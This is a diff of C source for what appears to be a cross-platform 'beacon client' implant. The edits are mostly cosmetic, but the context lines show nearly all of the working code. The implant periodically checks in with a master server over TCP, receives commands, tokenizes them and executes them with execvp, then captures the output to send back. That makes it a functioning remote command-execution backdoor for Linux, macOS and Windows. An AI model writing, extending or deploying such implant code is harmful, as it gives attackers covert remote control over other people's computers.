@@ -2,7 +2,7 @@
 #include <stdio.h>
 #include "beacon_client.h"
 
-// Main
+// main
 int main(){
     struct sockaddr_in master;
     char *data = NULL;
@@ -26,9 +26,11 @@ int main(){
         #endif
 
         #if defined(__apple__) || defined(__linux__) || defined(__unix__)
-        sleep(sleep_time); // seconds
+        // seconds
+        sleep(sleep_time);
         #elif __windows__
-        Sleep(sleep_time*1000); // seconds -> milliseconds
+        // seconds -> milliseconds
+        Sleep(sleep_time*1000);
         #endif
 
         #ifdef CLIENT_DEBUG
@@ -52,7 +54,7 @@ int main(){
                 strncpy(cmd,resp+4,cmdlen);
                 int len;
                 
-                //args
+                // args
                 char ** args = tokenize_cmd(cmd,&len);
                 #ifdef CLIENT_DEBUG
                 printf("Arguments:\n");
@@ -66,10 +68,10 @@ int main(){
                 }
                 #endif
                 
-                //run command
+                // run command
                 data = run_cmd(args);
 
-                //free
+                // free
                 free(cmd);
             }
         }
@@ -110,16 +112,19 @@ int main(){
  * param: count - pass by reference, count to be returned, strictly used for debugging @TODO eventually remove
  * return: array of strings, last string is a null pointer
  */
-char **tokenize_cmd(char *cmd, int *count){
-    uint32_t cmdlen = strlen(cmd);
-    char **tokens = (char **)malloc(sizeof(char *) * (cmdlen));
-    
+char **tokenize_cmd(char *cmd, int *count) {
     int is_quote = 0;
     int is_dquote = 0;
     uint32_t start = 0;
     uint32_t index = 0;
-    for (uint32_t end = 0; end <= cmdlen; end++){
-        //spaces
+    
+    // get size of cmd, allocate buffers
+    uint32_t cmdlen = strlen(cmd);
+    char **tokens = (char **)malloc(sizeof(char *) * (cmdlen));
+
+    // iterate over characters in command
+    for (uint32_t end = 0; end <= cmdlen; end++) {
+        // spaces
         if (!is_dquote && !is_quote && (cmd[end] == ' ' || cmd[end] == 0)){
             if (end > start) {
                 uint32_t toklen = (end - start);
@@ -132,10 +137,10 @@ char **tokenize_cmd(char *cmd, int *count){
             }
         }
 
-        //double quotes
+        // double quotes
         if (cmd[end] == '"' || (is_dquote && cmd[end] == 0)){
             if (is_quote){
-                //end quote
+                // end quote
                 if (end > start) {
                     uint32_t toklen = (end - start)+1;
                     tokens[index] = (char *)malloc(sizeof(char) * ((toklen)+1));
@@ -151,10 +156,10 @@ char **tokenize_cmd(char *cmd, int *count){
             }
         }
 
-        //single quotes
+        // single quotes
         if (cmd[end] == '\'' || (is_quote && cmd[end] == 0)){
             if (is_dquote){
-                //end quote
+                // end quote
                 if (end > start) {
                     uint32_t toklen = (end - start)+1;
                     tokens[index] = (char *)malloc(sizeof(char) * ((toklen)+1));
@@ -216,6 +221,7 @@ char *master_checkin(struct sockaddr_in master, char *data){
         #endif
             return server_reply;
     }
+
     // Establish connection
     if (connect(s, (struct sockaddr *) &master, sizeof(master)) < 0) {
         #ifdef CLIENT_DEBUG
@@ -223,6 +229,7 @@ char *master_checkin(struct sockaddr_in master, char *data){
         #endif
         return server_reply;
     }
+    
     // Send data
     if(data && send(s , data , strlen(data) , 0) < 0) {
         return server_reply; //something failed :(
@@ -233,28 +240,30 @@ char *master_checkin(struct sockaddr_in master, char *data){
         close(s);
         exit(0);
     }
-    //Receive a reply from the server
+    
+    // Receive a reply from the server
     if((recv_size = recv(s , server_reply , MASTER_RECV_SIZE , 0)) < 0) {
         puts("recv failed");
     }
     close(s);
+    
     #elif __windows__
     WSADATA wsa;
     SOCKET s;
 
     #ifdef CLIENT_DEBUG
-        printf("[master_checkin] Initialising...");
+    printf("[master_checkin] Initialising...");
     #endif
 
-    //initialize WSA
+    // initialize WSA
     if (WSAStartup(MAKEWORD(2,2),&wsa) != 0) {
         #ifdef CLIENT_DEBUG
-            printf("Failed. Error: %d",WSAGetLastError());
+        printf("Failed. Error: %d",WSAGetLastError());
         #endif
         return server_reply;
     }
 
-    //Create a socket
+    // Create a socket
     if((s = socket( AF_INET , SOCK_STREAM , 0 )) == INVALID_SOCKET) {
         #ifdef CLIENT_DEBUG
         printf("Could not create socket : %d" , WSAGetLastError());
@@ -271,12 +280,14 @@ char *master_checkin(struct sockaddr_in master, char *data){
     if( send(s , data , strlen(data) , 0) == SOCKET_ERROR) {
         return server_reply;
     }
-    //Receive a reply from the server
+
+    // Receive a reply from the server
     if((recv_size = recv(s , server_reply , MASTER_RECV_SIZE , 0)) == SOCKET_ERROR) {
         puts("recv failed");
     }
-    //Add a NULL terminating character to make it a proper string before printing
     #endif
+
+    // Add a NULL terminating character to make it a proper string before printing
     server_reply[recv_size] = '\0';
     return server_reply;
 }
@@ -303,12 +314,13 @@ char *get_os() {
  * desc: Runs a command for the OS it was compiled for, returns results of that command
  * param: args - list of arguments, arg[0] being the command
  * return: string of result of command, will be NULL if errors occurred
+ * @TODO: Move argument parsing call to here, change param to char *
  */
 char *run_cmd(char **args) {
     int pipes[2];
     pid_t pid;
     char *buf = (char *)malloc(sizeof(char) * BUF_SIZE);
-    bzero(buf, BUF_SIZE); //zero out buffer
+    bzero(buf, BUF_SIZE); // zero out buffer
 
     // pipe
     if (pipe(pipes)==-1) {
@@ -325,9 +337,9 @@ char *run_cmd(char **args) {
         #endif
         return NULL; // fail
     }
-
-    //char **args = (char **)malloc(sizeof(char *) * 2);
-    if(pid == 0) {
+    
+    // child
+    if (pid == 0) {
         // pipe->dup2->exec shell->write to stdin->send \n to stdin->read stdout save results->return results
         #if defined(__apple__) || defined(__linux__) || defined(__unix__)
         dup2(pipes[1], STDOUT_FILENO);
@@ -336,11 +348,11 @@ char *run_cmd(char **args) {
         _dup2(pipes[1], STDOUT_FILENO);
         #endif
         
-        //close stdin/out
+        // close stdin/out
         close(pipes[0]);
         close(pipes[1]);
         
-        //exec
+        // exec
         #if defined(__apple__) || defined(__linux__) || defined(__unix__)
         if (execvp(args[0],args) < 0) {
             perror("Error: Command not found\n");
@@ -351,7 +363,7 @@ char *run_cmd(char **args) {
         }
         #endif
 
-        //free
+        // free
         int j = 0;
         while (args[j] != 0){
             free(args[j]);
@@ -360,13 +372,13 @@ char *run_cmd(char **args) {
         free(args[j]);
         free(args);
         
-        //exit
+        // exit
         exit(0);
-    } else {
-        //close stdout
+    } else { // parent
+        // close stdout
         close(pipes[1]);
 
-        //read from stdin
+        // read from stdin
         read(pipes[0], buf, BUF_SIZE);
         
         #ifdef CLIENT_DEBUG
